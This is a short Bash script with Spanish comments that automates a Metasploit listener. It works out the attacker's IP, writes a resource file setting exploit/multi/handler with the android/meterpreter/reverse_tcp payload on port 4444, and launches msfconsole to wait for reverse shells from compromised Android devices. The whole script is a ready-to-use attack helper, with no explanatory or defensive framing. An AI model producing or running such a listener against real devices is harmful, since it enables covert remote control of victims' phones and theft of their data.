#!/bin/bash

# Función para mostrar el uso del script
usage() {
    echo "Uso: $0 [-ip <IP_ADDRESS>]"
    exit 1
}

# Inicializar la variable LOCAL_IP
LOCAL_IP=""

# Procesar argumentos de línea de comandos
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -ip) LOCAL_IP="$2"; shift ;;
        *) usage ;;
    esac
    shift
done

# Si no se proporcionó una IP, intentar obtener la IP local
if [[ -z "$LOCAL_IP" ]]; then
    LOCAL_IP=$(hostname -I | awk '{print $1}')
fi

# Verificar si la IP es válida
if [[ -z "$LOCAL_IP" ]]; then
    echo -e "\e[31mNo se pudo obtener la IP local y no se proporcionó una IP válida.\e[0m"
    usage
fi

# Generar el archivo config.rc con la IP local
cat <<EOL > config.rc
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $LOCAL_IP
set LPORT 4444
exploit -j
EOL

# Ejecutar Metasploit con el archivo config.rc
msfconsole -r config.rc